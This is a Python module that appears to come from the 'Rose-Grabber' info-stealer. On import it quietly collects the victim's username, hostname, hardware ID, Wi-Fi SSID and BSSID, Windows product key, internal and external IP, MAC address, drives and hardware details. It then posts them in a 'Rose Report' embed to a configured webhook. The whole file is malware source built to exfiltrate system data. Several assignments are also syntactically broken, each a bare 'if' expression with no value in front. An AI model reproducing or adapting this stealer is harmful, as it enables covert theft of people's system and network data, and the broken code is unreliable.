import os
import wmi
import subprocess
import GPUtil
import sys
import psutil
import pywifi
import uuid
import pyautogui
import pygame.camera
import socket
import platform
import requests
from bin.config import Config
from datetime import datetime

cc = Config()

webhook = cc.get_webhook()
eb_color = cc.get_color()

def get_drive_info():
    drive_info = []
    partitions = psutil.disk_partitions()

    for partition in partitions:
        drive = {}
        drive['device'] = partition.device
        drive['mountpoint'] = partition.mountpoint

        try:
            usage = psutil.disk_usage(partition.mountpoint)
            drive['total'] = usage.total
            drive['used'] = usage.used
            drive_info.append(drive)
        except OSError as e:
            continue

    return drive_info

def format_drive_info(drives):
    formatted_info = []
    for drive in drives:
        formatted = (
            f"Drive: {drive['device']} (Mountpoint: {drive['mountpoint']}) - "
            f"Total Space: {drive['total']} bytes - "
            f"Used Space: {drive['used']} bytes"
        )
        formatted_info.append(formatted)
    return " - ".join(formatted_info)

pygame.camera.init()
username = str(os.getenv("USERNAME"))
hostname = str(os.environ['COMPUTERNAME'])
hwid = str(subprocess.check_output('wmic csproduct get uuid').split(b'\n')[1].strip().decode("utf-8"))
wifi_interfaces = pywifi.PyWiFi().interfaces()
iface = wifi_interfaces[0] if wifi_interfaces else None
ssid, bssid = "No result", "No result"
if iface:
    iface.scan()
    for result in iface.scan_results():
        try:
            ssid = result.ssid
            bssid = result.bssid
        except:
            pass 
            # For some reason this may result in an error (https://github.com/DamagingRose/Rose-Grabber/issues/167)
            # pywifi/profile.py already initializes an SSID variable, so why this happens in unknown.

lang = if subprocess.check_output('wmic os get MUILanguages /format:list').decode().strip().split('\r\r\n')[0].split('=')[1] is not None else "No System Language"
system = if str(subprocess.check_output('wmic os get Caption /format:list').decode().strip().split('\r\r\n')[0].split('=')[1]) is not None else "No System Edition"
output = subprocess.check_output('wmic path softwarelicensingservice get OA3xOriginalProductKey', shell=True).decode().strip()
product_key = str(output.split('\n', 1)[-1].strip()) if output is not None else "No license"
ram = str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"
power = str(psutil.sensors_battery().percent) + "%" if psutil.sensors_battery() is not None else "No battery"
screen = f"{pyautogui.size()[0]}x{pyautogui.size()[1]}"
webcams_count = len(pygame.camera.list_cameras())
internal_ip = str(socket.gethostbyname(socket.gethostname()))
external_ip = str(requests.get('https://api.ipify.org').text)
gpus = GPUtil.getGPUs()
gpu_info = str("")
for gpu in gpus:
    gpu_info += f"GPU Name: {gpu.name} - GPU Driver: {gpu.driver} - GPU Memory Total: {gpu.memoryTotal}MB - GPU Memory Free: {gpu.memoryFree}MB - GPU Memory Used: {gpu.memoryUsed}MB"
info = wmi.WMI().Win32_Processor()[0]
cpu_info = str(f"Name: {info.Name} - Arch: x{info.AddressWidth} - Cores: {info.NumberOfCores}")
current_execution_path = str(os.path.join(os.getcwd(), sys.argv[0]))
drives = get_drive_info()
drive_info_string = str(format_drive_info(drives))
mac_address = str(':'.join(['{:02X}'.format((uuid.getnode() >> elements) & 0xFF) for elements in range(0,2*6,2)][::-1]))
processor_id = str(platform.processor())
device_model = if (str(subprocess.check_output("wmic csproduct get name"), "utf-8").split("\n")[1].strip()) is not None else "No Device Model"
current_time_iso = datetime.now().isoformat()

def send_device_information():

    embed = {
        "title":
        "Rose Report",
        "description":
        "Rose Instance - System Information",
        "color":
        eb_color,
        "fields": [
            {
                "name": "Hostname",
                "value":
                    f"`{hostname}`",
                "inline": False,
            },
            {
                "name": "Username",
                "value":
                    f"`{username}`",
                "inline": False,
            },
            {
                "name": "Device Model",
                "value":
                    f"`{device_model}`",
                "inline": False,
            },
            {
                "name": "HWID",
                "value":
                    f"`{hwid}`",
                "inline": False,
            },
            {
                "name": "SSID",
                "value":
                    f"`{ssid}`",
                "inline": False,
            },
            {
                "name": "BSSID",
                "value":
                    f"`{bssid}`",
                "inline": False,
            },
            {
                "name": "Language",
                "value":
                    f"`{lang}`",
                "inline": False,
            },
            {
                "name": "System",
                "value":
                    f"`{system}`",
                "inline": False,
            },
            {
                "name": "Product Key",
                "value":
                     f"`{product_key}`",
                "inline": False,
            },
            {
                "name": "RAM",
                "value":
                    f"`{ram}`",
                "inline": False,
            },
            {
                "name": "Power",
                "value":
                    f"`{power}`",
                "inline": False,
            },
            {
                "name": "Screen",
                "value":
                    f"`{screen}`",
                "inline": False,
            },
            {
                "name": "Webcams",
                "value":
                    f"`{webcams_count}`",
                "inline": False,
            },
            {
                "name": "Internal IP",
                "value":
                    f"`{internal_ip}`",
                "inline": False,
            },
            {
                "name": "External IP",
                "value":
                    f"`{external_ip}`",
                "inline": False,
            },
            {
                "name": "GPU",
                "value":
                    f"`{gpu_info}`",
                "inline": False,
            },
            {
                "name": "CPU",
                "value":
                    f"`{cpu_info}`",
                "inline": False,
            },
            {
                "name": "Current Execution Path",
                "value":
                    f"`{current_execution_path}`",
                "inline": False,
            },
            {
                "name": "Drives",
                "value":
                    f"`{drive_info_string}`",
                "inline": False,
            },
            {
                "name": "MAC Address",
                "value":
                    f"`{mac_address}`",
                "inline": False,
            },
            {
                "name": "Processor ID",
                "value":
                    f"`{processor_id}`",
                "inline": False,
            }
        ],
        "footer": {
            "text": cc.get_footer(),
            "icon_url": cc.get_avatar()
        },
        "author": {
            "name": cc.get_name(),
            "icon_url": cc.get_avatar()
        },
        "timestamp": current_time_iso
    }

    requests.post(webhook, json={"embeds": [embed]})
